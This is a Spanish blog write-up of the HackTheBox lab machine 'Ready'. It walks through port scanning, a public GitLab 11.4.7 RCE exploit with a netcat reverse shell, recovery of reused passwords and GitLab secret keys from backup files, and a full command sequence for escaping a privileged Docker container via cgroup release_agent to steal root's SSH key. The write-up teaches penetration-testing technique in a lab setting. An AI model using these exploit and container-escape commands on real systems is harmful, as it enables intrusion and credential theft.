<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<link rel="icon" href="/assets/images/lanz2.png">

<title>HackTheBox - Ready</title>

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Ready | Sh0x blog</title>
<meta name="generator" content="Jekyll v3.8.6" />
<meta property="og:title" content="HackTheBox - Ready" />
<meta name="author" content="lanz" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Máquina Linux nivel medio. Empezaremos readys a buscar exploits ante un lindo lobo (Gitlab), encontraremos contraseñas volando y tendremos que escapar de la ballena (Docker) :O" />
<meta property="og:description" content="Máquina Linux nivel medio. Empezaremos readys a buscar exploits ante un lindo lobo (Gitlab), encontraremos contraseñas volando y tendremos que escapar de la ballena (Docker) :O" />
<link rel="canonical" href="http://localhost:4000/htb/ready" />
<meta property="og:url" content="http://localhost:4000/htb/ready" />
<meta property="og:site_name" content="Sh0x blog" />
<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304banner.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-05-14T00:00:00-07:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304banner.png" />
<meta property="twitter:title" content="HackTheBox - Ready" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-05-14T00:00:00-07:00","datePublished":"2021-05-14T00:00:00-07:00","description":"Máquina Linux nivel medio. Empezaremos readys a buscar exploits ante un lindo lobo (Gitlab), encontraremos contraseñas volando y tendremos que escapar de la ballena (Docker) :O","headline":"HackTheBox - Ready","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/ready"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/ready"}</script>
<!-- End Jekyll SEO tag -->

    
<link href="/assets/css/prism.css" rel="stylesheet">

<link href="/assets/css/theme.css" rel="stylesheet">

<script src="/assets/js/jquery.min.js"></script>

</head>




<body>
	<!-- defer loading of font and font awesome -->
	<noscript id="deferred-styles">
		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	</noscript>


<!-- Begin Sidebar Navigation
================================================== -->

<div class="sidebar">    
</div>   
<div class="nav-icon">
    <div class="hamburger-bar"></div>
</div>
<div id="blackover-nav" class="blackover"></div>
<nav id="menu">
    <ul>
        <h3>El tiempo a destiempo</h3>
        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
        <li><a href="/categories#article">Artículos</a></li>
        <li><a href="/categories#htb">HackTheBox</a></li>
        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
    </ul>   
</nav>

<script src="/assets/js/lunr.js"></script>

<style>
    
</style>

<div class="wrap-search">
    <div class="d-flex align-items-center ml-auto">
        <i class="fas fa-search show-search"></i>
        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
        </form>
    </div>
</div>

<div id="lunrsearchresults">
    <ul></ul>
</div>

<script src="/assets/js/lunrsearchengine.js"></script>


<!-- End Sidebar Navigation
================================================== -->

<div class="site-content ">

<div class="container">

    <!-- Site Logo/Name
    ================================================== -->
   
    <a class="navbar-brand" href="/">
        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
    </a>  
   

    <!-- Site Tag
    ================================================== -->
    

    <!-- Content
    ================================================== -->
    <div class="main-content">
        <div class="entry-header">
    <!-- Post Title -->
    <h1 class="posttitle">HackTheBox - Ready</h1>
    <!-- Author & Date  Box -->
    
    
    <div class="d-flex align-items-center mt-4">
        <div>
            
            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
            
        </div>            
        <div>
        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
        <span class="post-date"><time class="post-date" datetime="2021-05-14">14 May 2021</time></span>           
        
        </div>            
    </div>
    
</div>

<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->


<!-- Featured Image -->

<div class="entry-featured-image">
    
    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304banner.png" alt="HackTheBox - Ready">
    
</div>


<!-- Content -->
<!-- Post, Page Content
================================================== -->
<div class="article-post">
    <!-- Toc if any -->
    
    <!-- End Toc -->
    <p>Máquina Linux nivel medio. Empezaremos readys a buscar exploits ante un lindo lobo (<strong>Gitlab</strong>), encontraremos contraseñas volando y tendremos que escapar de la ballena (<strong>Docker</strong>) :O</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304readyHTB.png" alt="304readyHTB" /></p>

<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>

<p>Creada por: <a href="https://www.hackthebox.eu/profile/27897">bertolis</a>.</p>

<p>Este writeup lo hice despues de haber resuelto la máquina, por lo tanto (quizás) iré muy directo :P</p>

<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>

<p>Tiene vulnerabilidades bastante comunes.</p>

<blockquote>
  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
</blockquote>

<p>…</p>

<ol>
  <li><a href="#enumeracion">Enumeración</a></li>
  <li><a href="#explotacion">Explotación</a></li>
  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li>
</ol>

<p>…</p>

<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>

<p>Empezamos realizando un escaneo de puertos para saber que servicios está corriendo la máquina:</p>

<pre><code class="language-bash">–» nmap -p- --open -v 10.10.10.220 -oG initScan
</code></pre>

<table>
  <thead>
    <tr>
      <th>Parámetro</th>
      <th style="text-align: left">Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p-</td>
      <td style="text-align: left">Escanea todos los 65535</td>
    </tr>
    <tr>
      <td>–open</td>
      <td style="text-align: left">Solo los puertos que están abiertos</td>
    </tr>
    <tr>
      <td>-v</td>
      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
    </tr>
    <tr>
      <td>-oG</td>
      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
    </tr>
  </tbody>
</table>

<pre><code class="language-bash">–» cat initScan 
# Nmap 7.80 scan initiated Wed Jan  6 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.220
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.220 ()   Status: Up
Host: 10.10.10.220 ()   Ports: 22/open/tcp//ssh///, 5080/open/tcp//onscreen///
# Nmap done at Wed Jan  6 25:25:25 2021 -- 1 IP address (1 host up) scanned in 89.87 seconds
</code></pre>

<p>Tenemos los siguientes servicios activos:</p>

<table>
  <thead>
    <tr>
      <th>Puerto</th>
      <th style="text-align: left">Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>22</td>
      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong>: Conexión remota segura mediante una Shell</td>
    </tr>
    <tr>
      <td>5080</td>
      <td style="text-align: left">Un puerto con poca información, veamos si en el siguiente escaneo conseguimos algo más</td>
    </tr>
  </tbody>
</table>

<p>Hagamos nuestro escaneo de scripts y versiones con base en cada puerto, con ello obtenemos información más detallada de cada servicio:</p>

<pre><code class="language-bash">–» nmap -p 22,5080 -sC -sV 10.10.10.220 -oN portScan
</code></pre>

<table>
  <thead>
    <tr>
      <th>Parámetro</th>
      <th style="text-align: left">Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p</td>
      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
    </tr>
    <tr>
      <td>-sC</td>
      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
    </tr>
    <tr>
      <td>-sV</td>
      <td style="text-align: left">Nos permite ver la versión del servicio</td>
    </tr>
    <tr>
      <td>-oN</td>
      <td style="text-align: left">Guarda el output en un archivo</td>
    </tr>
  </tbody>
</table>

<pre><code class="language-bash">–» cat portScan
# Nmap 7.80 scan initiated Wed Jan  6 25:25:25 2021 as: nmap -p 22,5080 -sC -sV -oN portScan 10.10.10.220
Nmap scan report for 10.10.10.220
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan  6 25:25:25 2021 -- 1 IP address (1 host up) scanned in 27.78 seconds
</code></pre>

<p>Tenemos:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Puerto</th>
      <th style="text-align: left">Servicio</th>
      <th style="text-align: left">Versión</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">22</td>
      <td style="text-align: left">SSH</td>
      <td style="text-align: left">OpenSSH 8.2p1 Ubuntu 4</td>
    </tr>
    <tr>
      <td style="text-align: left">5080</td>
      <td style="text-align: left">HTTP</td>
      <td style="text-align: left">nginx (Ahora si tenemos data :P)</td>
    </tr>
  </tbody>
</table>

<p>Pues empecemos a enumerar los servicios (:</p>

<p>…</p>

<h3 id="puerto-5080">Puerto 5080 <a href="#puerto-5080">⌖</a></h3>

<p>Ingresamos en la web: <code>10.10.10.220:5080</code> y obtenemos:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304page5080.png" alt="304page5080" /></p>

<p>Interesante, tenemos el servicio <code>GitLab</code>, que nos sirve para gestionar repositorios, controlar versiones de proyectos y mantener software desarrollado colaborativamente. Podemos crearnos una cuenta e ingresar al sistema, intentémoslo:</p>

<ul>
  <li><a href="https://about.gitlab.com/">about.gitlab.com</a></li>
</ul>

<p>Creamos la cuenta y si todo está bien, nos redirige al <strong>dashboard</strong> de proyectos:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304page5080_dash_projects.png" alt="304page5080_dash_projects" /></p>

<p>Nice, jmmm, pues veamos que podemos encontrar…</p>

<p>Despues de algo de jugueteo, encontramos la versión de <code>GitLab</code> en el apartado <code>/help</code>:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304page5080_version_gitlab.png" alt="304page5080_version_gitlab" /></p>

<ul>
  <li><code>GitLab 11.4.7</code>.</li>
</ul>

<p>Perfecto, ahora tenemos algo en lo que enfocarnos, pues a buscar si existen exploits para esa versión o que podemos intentar hacer con ella (:</p>

<p>…</p>

<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>

<p>Despues de un rato probando, me encontré este repositorio:</p>

<ul>
  <li><a href="https://github.com/dotPY-hax/gitlab_RCE">https://github.com/dotPY-hax/gitlab_RCE</a>.</li>
</ul>

<p>En el cual recopila algunos CVE’s con los cuales se logra ejecución remota en la máquina afectada, explotando así un <a href="https://portswigger.net/web-security/ssrf">SSRF</a> (que básicamente es manipular un servidor, a tal punto de contar con información con la cual no deberíamos contar :P) que juntándolo con un <a href="https://owasp.org/www-community/vulnerabilities/CRLF_Injection">CSRF injection</a> (que nos permite jugar con los <code>submit</code> entre aplicaciones) hacia el protocolo <a href="https://stackoverflow.com/questions/33846856/what-exactly-is-the-git-protocol#answer-33846897">git://</a> lograr <strong><em>Remote Command Execution</em></strong> (RCE):</p>

<p>Revisando el código debemos cambiar el puerto al que queramos hacer la reverse Shell. Nos ponemos en escucha primero:</p>

<pre><code class="language-bash">–» nc -lvp 4433
listening on [any] 4433 ...
</code></pre>

<p>Ahora ejecutamos:</p>

<pre><code class="language-bash">–» python3 gitlab_rce.py 
usage: gitlab_rce.py &lt;http://gitlab:port&gt; &lt;local-ip&gt;
</code></pre>

<pre><code class="language-bash">–» python3 gitlab_rce.py http://10.10.10.220:5080 10.10.14.159
Gitlab Exploit by dotPY [LOL]
registering kDf551GgUn:VutawCPqGC - 200
Getting version of http://10.10.10.220:5080 - 200
The Version seems to be 11.4.7! Choose wisely
delete user kDf551GgUn - 200
[0] - GitlabRCE1147 - RCE for Version &lt;=11.4.7
[1] - GitlabRCE1281LFIUser - LFI for version 10.4-12.8.1 and maybe more
[2] - GitlabRCE1281RCE - RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP
type a number and hit enter to choose exploit: 
</code></pre>

<p>Damos a la opción <code>0</code>, ya que es nuestra versión yyyyyyyyy:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304bash_revSH_gitlab.png" alt="304bash_revSH_gitlab" /></p>

<p>Tenemos una Shell como el usuario <code>git</code> en el sistema. Antes de seguir hagámosle un tratamiento a la Shell (TTY), ya que con la que tenemos estamos limitados, no podemos ver los comandos anteriormente ingresados, no podemos hacer <code>CTRL + C</code> y demás cosas que podemos hacer en una sesión completa:</p>

<ul>
  <li><a href="https://www.youtube.com/watch?v=GVjNI-cPG6M&amp;t=1689">Youtube - S4vitar explicando como hacer tratamiento de la TTY</a>.</li>
</ul>

<p>Listosss, ahora a enumerar…</p>

<p>El archivo <code>user.txt</code> puede ser visualizado con el usuario <code>git</code>, aunque su propietario es <code>dude</code> :O</p>

<p>…</p>

<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>

<p>En la raíz hay un objeto llamativo (cuál es? e.e) pero pues solo es eso, llamativo, ya que esa “pass” no nos sirve con ningún usuario:</p>

<pre><code class="language-bash">git@gitlab:/home/dude$ ls /
RELEASE  assets  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  root_pass  run  sbin  srv  sys  tmp  usr  var
git@gitlab:/home/dude$ cat /root_pass 
YG65407Bjqvv9A0a8Tm_7w
</code></pre>

<p>Despues de un rato enumerando y no revisar lo basico :l encontramos esta carpeta:</p>

<pre><code class="language-bash">git@gitlab:~$ ls -la /opt/
total 24
drwxr-xr-x 1 root root 4096 Dec  1 16:23 .
drwxr-xr-x 1 root root 4096 Jan 24 23:19 ..
drwxr-xr-x 2 root root 4096 Dec  7 09:25 backup
drwxr-xr-x 1 root root 4096 Dec  1 12:41 gitlab
</code></pre>

<pre><code class="language-bash">git@gitlab:~$ ls -la /opt/backup/
total 112
drwxr-xr-x 2 root root  4096 Dec  7 09:25 .
drwxr-xr-x 1 root root  4096 Dec  1 16:23 ..
-rw-r--r-- 1 root root   872 Dec  7 09:25 docker-compose.yml
-rw-r--r-- 1 root root 15092 Dec  1 16:23 gitlab-secrets.json
-rw-r--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb
git@gitlab:~$
</code></pre>

<p>Revisando cada archivo tenemos curiosidades:</p>

<p>¬ <strong>docker-compose.yml</strong>:</p>

<pre><code class="language-bash">git@gitlab:/opt/backup$ cat docker-compose.yml
</code></pre>

<pre><code class="language-yml">version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16
</code></pre>

<ul>
  <li>Tenemos el archivo <code>root_pass</code>, que está siendo usado para la ejecución de GitLab.</li>
  <li>El puerto <code>5080</code> debe estar haciendo algún tipo de Forwarding sobre el <code>80</code>.</li>
  <li>Monturas, donde i.e: <code>./srv/gitlab/config</code> esta sobre la ruta <code>/etc/gitlab</code>. Y así con las demás.</li>
  <li>Ah y que al tener el archivo <a href="https://dockertips.com/utilizando-docker-compose"><code>docker-compose.yml</code></a> sabemos que estamos <a href="https://dockertips.com/utilizando-docker-compose">dentro de un contenedor</a>.</li>
</ul>

<p>¬ <strong>gitlab-secrets.json</strong>:</p>

<pre><code class="language-bash">git@gitlab:/opt/backup$ cat gitlab-secrets.json
</code></pre>

<pre><code class="language-json">{
   "gitlab_workhorse":{
      "secret_token":"/HvvEvI/T33qyvK1U4jmnfH7fGxzySlzuhewkOR9Zk0="
   },
   "gitlab_shell":{
      "secret_token":"bad62f769ebf4f96f0114e406fa4605eb25cffd8b629bcff8419bb9078df53b42a219186a19d889a2dfb4f10eb65e6cdc3d784cf70f07c3c29947fc6f1523c14"
   },
   "gitlab_rails":{
      "secret_key_base":"b7c70c02d37e37b14572f5387919b00206d2916098e3c54147f9c762d6bef2788a82643d0c32ab1cdb315753d6a4e59271cddf9b41f37c814dd7d256b7a2f353",
      "db_key_base":"eaa32eb7018961f9b101a330b8a905b771973ece8667634e289a0383c2ecff650bb4e7b1a6034c066af2f37ea3ee103227655c33bc17c123c99f421ee0776429",
      "otp_key_base":"b30e7b1e7e65c31d70385c47bc5bf48cbe774e39492280df7428ce6f66bc53ec494d2fbcbf9b49ec204b3ba741261b43cdaf7a191932f13df1f5bd6018458e56",
      "openid_connect_signing_key":"\"-----BEGIN RSA PRIVATE KEY-----\nMIIJKAIBAAKCAgEA2l/m01GZYRj9Iv5A49uAULFBomOnHxHnQ5ZvpUPRj1fMovoC\ndQBdEPdcB+KmsHKbtv21Ycfe8fK2RQpTZPq75AjQ37x63S/lpVEnF7kxcAAf0mRw\nBEtKoBs3nodnosLdyD0+gWl5OHO8MSghGLj/IrAuZzYPXQ7mlEgZXVPezJvYyUZ3\\..."
      ...
</code></pre>

<p>En internet dice que es un archivo para restaurar el sistema en caso tal o.o</p>

<p>¬ <strong>gitlab.rb</strong>:</p>

<pre><code class="language-bash">git@gitlab:/opt/backup$ cat gitlab.rb
## GitLab configuration settings
##! This file is generated during initial installation and **is not** modified
##! during upgrades.
...
</code></pre>

<p>Un archivo con muchos comentarios (: si se los quitamos nos encontramos:</p>

<pre><code class="language-bash">git@gitlab:/opt/backup$ cat gitlab.rb | grep -vE "^#" | uniq -u
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
</code></pre>

<blockquote>
  <p>Con <code>-E</code> le ingresamos la expresion regular, para que tome todo lo que inicie con <code>#</code>. Y con <code>-v</code> le indicamos que nos borre ese output.</p>
</blockquote>

<p>Tenemos una contraseña, intentemos probar con los usuarios:</p>

<pre><code class="language-bash">git@gitlab:/opt/backup$ su dude
Password: 
su: Authentication failure
</code></pre>

<pre><code class="language-bash">git@gitlab:/opt/backup$ su root
Password: 
root@gitlab:/opt/backup# id
uid=0(root) gid=0(root) groups=0(root)
root@gitlab:/opt/backup#
</code></pre>

<p>Opa, somos usuario administrador del sistema :) Ahora solo nos quedaría ver las flags:</p>

<pre><code class="language-bash">root@gitlab:~# ls -la
total 24
drwx------ 1 root root 4096 Jan 24 22:37 .
drwxr-xr-x 1 root root 4096 Jan 24 23:19 ..
lrwxrwxrwx 1 root root    9 Dec  7 16:56 .bash_history -&gt; /dev/null
-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwx------ 2 root root 4096 Dec  7 16:49 .ssh
-rw------- 1 root root 2136 Jan 24 22:37 .viminfo
root@gitlab:~# pwd
/root
root@gitlab:~# 
</code></pre>

<p>Ehhh?</p>

<p>Pues no esta y no, no es error de la máquina. Acá estuve un rato atascado (buen rato) enumerando… Me fui para el foro y lo primero que vi fue <code>"Escape!"</code>. Relacionando las cosas entendí que al estar en un contenedor, debía buscar una manera de moverme (“escapar”) al host.</p>

<p><a href="https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1">Este artículo</a> explica muy bien como es el proceso, vamos a repasarlo:</p>

<blockquote>
  <p>Are containers that are run with the <code>--privileged</code> flag. Unlike regular containers, these containers have root privilege to the host machine. <a href="https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1">Vickie Li</a></p>
</blockquote>

<p>Pues si, a veces necesario (pero siempre peligroso) para cumplir algunas tareas. Pero bueno, primero debemos saber si estamos sobre un contenedor explotable :P</p>

<p>Para saberlo nos apoyamos del feature en Linux que aísla el uso de recursos (que en nuestro caso Docker lo usa para asilar sus contenedores), llamado <code>cgroup</code> (control groups) ubicado en <code>proc/1/cgroup</code>:</p>

<pre><code class="language-bash">root@gitlab:~# cat /proc/1/cgroup
12:freezer:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
11:blkio:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
10:cpuset:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
9:devices:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
8:memory:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
7:cpu,cpuacct:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
6:perf_event:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
5:rdma:/
4:net_cls,net_prio:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
3:hugetlb:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
2:pids:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
1:name=systemd:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
0::/system.slice/containerd.service
</code></pre>

<p>El artículo nos dice que si estamos dentro de un contenedor debemos ver <code>/docker/ID_del_contenedor</code>. Así que vamos bien (:</p>

<p>Ahora, ¿cómo sabemos si tiene el atributo <code>--privileged</code>?: lo explica, pero no pude probarlo, ya que el comando no está habilitado :P Peeero vamos a creer que si lo tenemos activado (pensamiento lateral e.e)… Escapemos:</p>

<ul>
  <li><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">Understanding Docker Container Escapes - trailofbits.com</a>.</li>
</ul>

<p>Creamos un <code>cgroup</code>:</p>

<pre><code class="language-bash">root@gitlab:~# mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x
</code></pre>

<p>Habilitamos el feature (<code>release_agent</code>) que está siendo ejecutado desde el host como <code>root</code>:</p>

<blockquote>
  <p>release_agent: the path to use for release notifications (this file exists in the top cgroup only) <a href="https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt">kernel.org/cgroups</a></p>
</blockquote>

<pre><code class="language-bash">root@gitlab:~# echo 1 &gt; /tmp/cgrp/x/notify_on_release
</code></pre>

<p>Ahora alojamos la ruta del archivo que tendrá nuestros comandos hacia el archivo conteniendo el feature:</p>

<pre><code class="language-bash">root@gitlab:~# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@gitlab:~# echo $host_path
/var/lib/docker/overlay2/72682da51e1ec80c609bc446d141ff5afed2037d1bdf2810550ecff7fb552e68/diff
root@gitlab:~# echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent
</code></pre>

<p>Terminando, añadimos nuestros comandos al archivo, donde <code>/cmd</code> son los comandos y <code>/output</code> la respuesta:</p>

<pre><code class="language-bash">root@gitlab:~# echo '#!/bin/sh' &gt; /cmd
root@gitlab:~# echo "ls -la /root &gt; $host_path/output" &gt;&gt; /cmd
root@gitlab:~# chmod a+x /cmd
</code></pre>

<p>En mi caso quiero listar el directorio home de <code>root</code>.</p>

<p>Finalmente ejecutamos un proceso que termina sobre el <code>cgroup</code> que hemos creado y nuestro <code>release_agent</code> es lanzado:</p>

<pre><code class="language-bash">root@gitlab:~# sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
</code></pre>

<p>Veamos el resultado en el archivo <code>/output</code>:</p>

<pre><code class="language-bash">root@gitlab:/# cat cmd 
#!/bin/sh
ls -la /root &gt; /var/lib/docker/overlay2/72682da51e1ec80c609bc446d141ff5afed2037d1bdf2810550ecff7fb552e68/diff/output
</code></pre>

<pre><code class="language-bash">root@gitlab:/# cat output 
total 60
drwx------ 10 root root 4096 Dec  7 17:02 .
drwxr-xr-x 20 root root 4096 Dec  7 17:44 ..
lrwxrwxrwx  1 root root    9 Jul 11  2020 .bash_history -&gt; /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 May  7  2020 .cache
drwx------  3 root root 4096 Jul 11  2020 .config
-rw-r--r--  1 root root   44 Jul  8  2020 .gitconfig
drwxr-xr-x  3 root root 4096 May  7  2020 .local
lrwxrwxrwx  1 root root    9 Dec  7 17:02 .mysql_history -&gt; /dev/null
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   75 Jul 12  2020 .selected_editor
drwx------  2 root root 4096 Dec  7 16:49 .ssh
drwxr-xr-x  2 root root 4096 Dec  1 12:28 .vim
lrwxrwxrwx  1 root root    9 Dec  7 17:02 .viminfo -&gt; /dev/null
drwxr-xr-x  3 root root 4096 Dec  1 12:41 docker-gitlab
drwxr-xr-x 10 root root 4096 Jul  9  2020 ready-channel
-r--------  1 root root   33 Jul  8  2020 root.txt
drwxr-xr-x  3 root root 4096 May 18  2020 snap
root@gitlab:/# 
</code></pre>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304google_gif_omgBOOM.gif" style="display: block; margin-left: auto; margin-right: auto; width: 40%;" /></p>

<p>Perfecto, perfectisimo… Pues hagamos lo mismo, pero extraigamos la llave privada SSH (<code>id_rsa</code>) del usuario root (bueno, si es que existe), para así entrar sin necesitar contraseña:</p>

<pre><code class="language-bash">...
...
root@gitlab:~# echo '#!/bin/sh' &gt; /cmd
root@gitlab:~# echo "cat /root/.ssh/id_rsa &gt; $host_path/output" &gt;&gt; /cmd
root@gitlab:~# chmod a+x /cmd
...
...
</code></pre>

<p>Y el resultado:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304bash_idRSA_root.png" alt="304bash_idRSA_root" /></p>

<p>Ahora guardémosla en un archivo, le damos los permisos necesarios (<code>chmod 600 keyroot</code>) y entremos :O</p>

<pre><code class="language-bash">–» ssh root@10.10.10.220 -i keyroot
</code></pre>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304bash_idRSA_root_shell.png" alt="304bash_idRSA_root_shell" /></p>

<p>Ta nice eh!! Bueno, solo nos quedaría ver las flags:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304flags1.png" alt="304flags1" /></p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304flags2.png" alt="304flags2" /></p>

<p>…</p>

<p>Final de la máquina neas :P En general me gusto, el tema de <strong>Docker</strong> está superinteresante y loco.</p>

<p>¡Nos charlamos en otro set de ideas y bueno, a seguir rompiendo todo!! ❤️🖤</p>

</div>

<!-- Rating -->


<!-- Author Box if enabled from _config.yml -->
<!-- Author Box -->




<!-- Comments if not disabled with comments: false -->
<!-- Comments
================================================== -->
 
<div class="comments">
    <button class="btn btn-dark show-comments">Comentarios</button>         
    <div id="comments">  
        <h4 class="mb-4">Comments</h4>                 
            <section class="disqus">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = 'demowebsite'; 
        var disqus_developer = 0;
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
